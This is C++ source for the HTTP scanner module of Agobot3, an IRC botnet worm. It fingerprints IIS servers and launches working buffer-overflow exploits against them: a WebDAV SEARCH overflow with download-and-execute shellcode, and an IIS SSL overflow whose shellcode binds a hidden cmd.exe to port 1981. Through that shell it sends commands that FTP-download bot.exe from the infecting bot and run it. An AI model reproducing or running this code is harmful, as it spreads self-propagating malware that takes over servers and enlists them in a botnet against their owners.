/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2004 Ago and the Agobot team
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary and source may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.
	4. The person using this sourcecode is a developer of said sourcecode.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	This license may be changed without prior notice.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#include "main.h"
#include "mainctrl.h"
#include "scanner.h"
#ifdef __COMPILE_SCANNER_HTTP__
#include "utility.h"
#include "shellcode.h"

#define HTTP_TYPE_UNKNOWN				0
#define HTTP_TYPE_IIS_60				1
#define HTTP_TYPE_IIS_55				2
#define HTTP_TYPE_IIS_50				3
#define HTTP_TYPE_IIS_40				4
#define HTTP_TYPE_APACHE_1X_UNIX		5
#define HTTP_TYPE_APACHE_1X_WIN32		6
#define HTTP_TYPE_APACHE_2X_UNIX		7
#define HTTP_TYPE_APACHE_2X_WIN32		8

#define HTTP_OPTION_UNKNOWN				0
#define HTTP_OPTION_WEBDAV				1

class CScannerHTTP : public CScannerBase
{
public:
			 CScannerHTTP();
	virtual	~CScannerHTTP() throw() { }
	bool	 Exploit();

private:
	bool	 ExploitIISUnicode(int iHTTPType=HTTP_TYPE_UNKNOWN);
	bool	 ExploitIISWebDav(int iHTTPType=HTTP_TYPE_UNKNOWN, unsigned short sRet=0x4F4E);
	bool	 ExploitIISSSL(int iHTTPType=HTTP_TYPE_UNKNOWN);

	int		 CheckHead();
	int		 CheckOptions();
};

CScannerHTTP::CScannerHTTP() { m_szType="CScannerHTTP"; m_sScannerName.Assign("HTTP"); }

bool CScannerHTTP::Exploit() {
	int iHTTPType=CheckHead(), iOptions; switch(iHTTPType) {
	case HTTP_TYPE_IIS_55: {
		iOptions=CheckOptions();
		ExploitIISSSL(iHTTPType);
		if(iOptions==HTTP_OPTION_WEBDAV) ExploitIISWebDav(iHTTPType, 0x4F4E);	// SP3
		if(iOptions==HTTP_OPTION_WEBDAV) ExploitIISWebDav(iHTTPType, 0x4142);	// ~SP0 ~SP2
		if(iOptions==HTTP_OPTION_WEBDAV) ExploitIISWebDav(iHTTPType, 0x4143);	// ~SP1 ~SP2
		ExploitIISUnicode(); }
	break;
	case HTTP_TYPE_IIS_50: {
		iOptions=CheckOptions();
		ExploitIISSSL(iHTTPType);
		if(iOptions==HTTP_OPTION_WEBDAV) ExploitIISWebDav(iHTTPType, 0x4F4E);	// SP3
		if(iOptions==HTTP_OPTION_WEBDAV) ExploitIISWebDav(iHTTPType, 0x4142);	// ~SP0 ~SP2
		if(iOptions==HTTP_OPTION_WEBDAV) ExploitIISWebDav(iHTTPType, 0x4143);	// ~SP1 ~SP2
		ExploitIISUnicode(); }
	break;
	case HTTP_TYPE_IIS_40: {
		ExploitIISUnicode(); }
	break;
	default: break; }

	return false; }

int CScannerHTTP::CheckHead()
{	int iRetVal=HTTP_TYPE_UNKNOWN; CString sHeadBuf, sReplyBuf;

	if(!m_sSocket.Connect(m_sSocket.m_szHost, 80)) return HTTP_TYPE_UNKNOWN;

	sHeadBuf.Assign("HEAD / HTTP/1.0\r\n\r\n");
	if(!m_sSocket.Write(sHeadBuf.CStr(), sHeadBuf.GetLength())) return HTTP_TYPE_UNKNOWN;
	if(!m_sSocket.Recv(sReplyBuf.GetBuffer(4097), 4096)) return HTTP_TYPE_UNKNOWN;

	if(!sReplyBuf.Find("200 OK")) return HTTP_TYPE_UNKNOWN;

	if     (sReplyBuf.Find("Microsoft-IIS/6.0")) { iRetVal=HTTP_TYPE_IIS_60; }
	else if(sReplyBuf.Find("Microsoft-IIS/5.5")) { iRetVal=HTTP_TYPE_IIS_55; }
	else if(sReplyBuf.Find("Microsoft-IIS/5.0")) { iRetVal=HTTP_TYPE_IIS_50; }
	else if(sReplyBuf.Find("Microsoft-IIS/4.0")) { iRetVal=HTTP_TYPE_IIS_40; }
	else if(sReplyBuf.Find("Apache/1") && sReplyBuf.Find(" (Unix) ")) { iRetVal=HTTP_TYPE_APACHE_1X_UNIX; }
	else if(sReplyBuf.Find("Apache/1") && sReplyBuf.Find(" (Win32) ")) { iRetVal=HTTP_TYPE_APACHE_1X_WIN32; }
	else if(sReplyBuf.Find("Apache/2") && sReplyBuf.Find(" (Unix) ")) { iRetVal=HTTP_TYPE_APACHE_2X_UNIX; }
	else if(sReplyBuf.Find("Apache/2") && sReplyBuf.Find(" (Win32) ")) { iRetVal=HTTP_TYPE_APACHE_2X_WIN32; }

	m_sSocket.Disconnect(); return iRetVal; }

int CScannerHTTP::CheckOptions()
{	int iRetVal=HTTP_OPTION_UNKNOWN; CString sOptionsBuf, sReplyBuf;

	if(!m_sSocket.Connect(m_sSocket.m_szHost, 80)) return HTTP_OPTION_UNKNOWN;

	sOptionsBuf.Assign("OPTIONS * HTTP/1.0\r\n\r\n");
	if(!m_sSocket.Write(sOptionsBuf.CStr(), sOptionsBuf.GetLength())) return HTTP_OPTION_UNKNOWN;
	if(!m_sSocket.Recv(sReplyBuf.GetBuffer(4097), 4096)) return HTTP_OPTION_UNKNOWN;

	if(!sReplyBuf.Find("200 OK")) {
		sOptionsBuf.Assign("OPTIONS / HTTP/1.0\r\n\r\n");
		if(!m_sSocket.Write(sOptionsBuf.CStr(), sOptionsBuf.GetLength())) return HTTP_OPTION_UNKNOWN;
		if(!m_sSocket.Recv(sReplyBuf.GetBuffer(4097), 4096)) return HTTP_OPTION_UNKNOWN;
		if(!sReplyBuf.Find("200 OK")) return HTTP_OPTION_UNKNOWN; }

	if(		sReplyBuf.Find("DAV: 1, 2")	) { iRetVal=HTTP_OPTION_WEBDAV;	}
	else if(sReplyBuf.Find("SEARCH")	) { iRetVal=HTTP_OPTION_WEBDAV;	}
	else if(sReplyBuf.Find("PROPFIND")	) { iRetVal=HTTP_OPTION_WEBDAV;	}

	m_sSocket.Disconnect(); return iRetVal; }

bool CScannerHTTP::ExploitIISUnicode(int iHTTPType) {
	return false; }

char jumpcode[]=
	"\x8b\xf9\x32\xc0\xfe\xc0\xf2\xae\xff\xe7";

char body[]=
	"<?xml version=\"1.0\"?>\r\n<g:searchrequest xmlns:g=\"DAV:\">\r\n"
	"<g:sql>\r\nSelect \"DAV:displayname\" from scope()\r\n</g:sql>\r\n"
	"</g:searchrequest>\r\n";

bool CScannerHTTP::ExploitIISWebDav(int iHTTPType, unsigned short sRet) {
	char szSCBuf[4096]; char szShellBuf[4096]; char *szReqBuf=(char*)malloc(100000);
	unsigned short ret=sRet; int iShellSize=0, iPos=0, iSCSize=0, iReqSize=0, iNOPSize=100, rt=0, r=0;

	CString sURL;

	if(IsPrivate(g_pMainCtrl->m_pIRC->m_sLocalIp.CStr()) && !IsPrivate(m_sSocket.m_szHost))
		sURL.Format("ftp://bla:bla@%s:%d/bot.exe", g_pMainCtrl->m_pIRC->m_sLocalHost.CStr(), \
			g_pMainCtrl->m_pBot->bot_ftrans_port_ftp.iValue);
	else
		sURL.Format("ftp://bla:bla@%s:%d/bot.exe", inet_ntoa(to_in_addr(g_pMainCtrl->m_pIRC->m_lLocalAddr)), \
			g_pMainCtrl->m_pBot->bot_ftrans_port_ftp.iValue);

	iShellSize=setup_shellcode_udtf(szShellBuf, sizeof(szShellBuf), sURL.Str(), false);
	
	// Build a buffer with the shellcode
	memset(szSCBuf+iPos,	'\x90',				iNOPSize					); iPos+=iNOPSize;
	memcpy(szSCBuf+iPos,	szShellBuf,			iShellSize					); iPos+=iShellSize;
	iSCSize=iPos; iPos=0;

	// Build the request
	memset(szReqBuf, 0, 100000);
	strcpy(szReqBuf, "SEARCH /");
	unsigned int j, i=strlen(szReqBuf); szReqBuf[i]='\x90';
	for(j=i+1; j<i+2150; j+=2) { *(unsigned short*)&szReqBuf[j]=(unsigned short)ret; } // EIP will be szReqBuf[8+2087]
	for(;j<i+65535-strlen(jumpcode);j++) szReqBuf[j]='\x90'; // The rest is padded with NOP's. RET address should point to this zone!
	memcpy(&szReqBuf[j], jumpcode, strlen(jumpcode)); // Then we skip the body of the HTTP request

	strcpy(szReqBuf+strlen(szReqBuf), " HTTP/1.1\r\n");
	sprintf(szReqBuf+strlen(szReqBuf), "Host: %s\r\nContent-Type: text/xml\r\nContent-Length: %d\r\n\r\n", m_sSocket.m_szHost, strlen(body)+iShellSize);
	strcpy(szReqBuf+strlen(szReqBuf), body);
	memset(szReqBuf+strlen(szReqBuf), 0x01, 1);
	memset(szReqBuf+strlen(szReqBuf), 0x90, 3);
	strcpy(szReqBuf+strlen(szReqBuf), szSCBuf);
	iReqSize=strlen(szReqBuf);
	
	// Connect to the server
	if(!m_sSocket.Connect(m_sSocket.m_szHost, 80)) // Connect failed, exit
	{	free(szReqBuf); return false; }

	// Send the evil request
	if(!m_sSocket.Write(szReqBuf, iReqSize)) { m_sSocket.Disconnect(); free(szReqBuf); return false; }
	// Read reply
	m_sSocket.RecvTO(szReqBuf, sizeof(szReqBuf), 5000);

	// Close the socket that was once funky fresh
	m_sSocket.Disconnect(); free(szReqBuf); return true; }

#define jumper					"\xeb\x0f"
#define greetings_to_microsoft	"\x4E\x49\x4C\x53\x49\x53\x47\x41\x59\x21\x21"

bool CScannerHTTP::ExploitIISSSL(int iHTTPType) {
	unsigned int	i;
	unsigned char	*badbuf, *p;
	unsigned long	offset=0x6741a1cd, XOR=0xffffffff;

	if(g_pMainCtrl->m_pBot->scaninfo_level.iValue >= 2) {
		SendLocal("%s: scanning ip %s", m_sScannerName.CStr(), m_sSocket.m_szHost); } 
	
	char sslshit[]="\x80\x62\x01\x02\xbd\x00\x01\x00\x01\x00\x16\x8f\x82\x01\x00\x00\x00";

	/* hidden cmd.exe, bind port 1981 */
	char shellcode[]="\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x66\x01\x80\x34\x0A\x99\xE2\xFA\xEB\x05\xE8\xEB\xFF\xFF\xFF\x70\x99\x98\x99\x99\xC3\x21\x95\x69\x64\xE6\x12\x99\x12\xE9\x85\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x9A\x6A\x12\xEF\xE1\x9A\x6A\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8\x12\xA6\x9A\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED\x91\xC0\xC6\x1A\x5E\x9D\xDC\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF\xBD\x9A\x5A\x48\x78\x9A\x58\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A\x5A\x58\x78\x9B\x9A\x58\x12\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F\x97\x12\x49\xF3\x9A\xC0\x71\xE5\x99\x99\x99\x1A\x5F\x94\xCB\xCF\x66\xCE\x65\xC3\x12\x41\xF3\x9D\xC0\x71\xF0\x99\x99\x99\xC9\xC9\xC9\xC9\xF3\x98\xF3\x9B\x66\xCE\x69\x12\x41\x5E\x9E\x9B\x99\x9E\x24\xAA\x59\x10\xDE\x9D\xF3\x89\xCE\xCA\x66\xCE\x6D\xF3\x98\xCA\x66\xCE\x61\xC9\xC9\xCA\x66\xCE\x65\x1A\x75\xDD\x12\x6D\xAA\x42\xF3\x89\xC0\x10\x85\x17\x7B\x62\x10\xDF\xA1\x10\xDF\xA5\x10\xDF\xD9\x5E\xDF\xB5\x98\x98\x99\x99\x14\xDE\x89\xC9\xCF\xCA\xCA\xCA\xF3\x98\xCA\xCA\x5E\xDE\xA5\xFA\xF4\xFD\x99\x14\xDE\xA5\xC9\xCA\x66\xCE\x7D\xC9\x66\xCE\x71\xAA\x59\x35\x1C\x59\xEC\x60\xC8\xCB\xCF\xCA\x66\x4B\xC3\xC0\x32\x7B\x77\xAA\x59\x5A\x71\x62\x67\x66\x66\xDE\xFC\xED\xC9\xEB\xF6\xFA\xD8\xFD\xFD\xEB\xFC\xEA\xEA\x99\xDA\xEB\xFC\xF8\xED\xFC\xC9\xEB\xF6\xFA\xFC\xEA\xEA\xD8\x99\xDC\xE1\xF0\xED\xC9\xEB\xF6\xFA\xFC\xEA\xEA\x99\xD5\xF6\xF8\xFD\xD5\xF0\xFB\xEB\xF8\xEB\xE0\xD8\x99\xEE\xEA\xAB\xC6\xAA\xAB\x99\xCE\xCA\xD8\xCA\xF6\xFA\xF2\xFC\xED\xD8\x99\xFB\xF0\xF7\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99\xF8\xFA\xFA\xFC\xE9\xED\x99";

	badbuf=(unsigned char*)malloc(347); memset(badbuf, 0, 347);
	p=badbuf; memcpy(p, sslshit, sizeof(sslshit));
	p+=sizeof(sslshit)-1; strcat((char*)p, jumper);
	strcat((char*)p, greetings_to_microsoft);

	offset^=XOR; strncat((char*)p, (char*)&offset, 4);
	strcat((char*)p, shellcode);

	if(!m_sSocket.Write((char*)badbuf, 346)) { m_sSocket.Disconnect(); return false; }
	Sleep(1000); CSocket outSocket;
	if(!outSocket.Connect(m_sSocket.m_szHost, 1981)) {
		if(g_pMainCtrl->m_pBot->scaninfo_level.iValue>=2)
			SendLocal("%s: Not vulnerable: %s", m_sScannerName.CStr(), m_sSocket.m_szHost);
		m_sSocket.Disconnect(); return false; }

	/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
	/* Thanks to PhaTTy for this piece of code :)                */
	char mkdir_buff[400]="";
	int iPort=g_pMainCtrl->m_pBot->bot_ftrans_port_ftp.iValue;
	/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/

	sprintf(mkdir_buff, "echo open %s %d > bla.txt\necho user blah blah >> bla.txt\necho binary >> bla.txt\necho get %s >> bla.txt\necho quit >> bla.txt\nftp.exe -n -s:bla.txt\n%s\n",
		g_pMainCtrl->m_pIRC->m_sLocalIp.CStr(), iPort, "bot.exe", "bot.exe");

	char szRecvBuf[8192];
	if(!outSocket.RecvTO(szRecvBuf, sizeof(szRecvBuf), 5000)) {
		m_sSocket.Disconnect(); outSocket.Disconnect(); return false; }

	Sleep(500);

	if(!outSocket.Write((char *) mkdir_buff, sizeof(mkdir_buff))) {
		m_sSocket.Disconnect(); outSocket.Disconnect(); return false; }

	/* successful!!! */
	if(g_pMainCtrl->m_pBot->scaninfo_level.iValue>=2) {
		SendLocal("%s: Exploited %s", m_sScannerName.CStr(), m_sSocket.m_szHost); }

	m_sSocket.Disconnect(); return true; }

REGSCANNER(HTTP_80, HTTP, 80, true, false, false)

#endif // __COMPILE_SCANNER_HTTP__
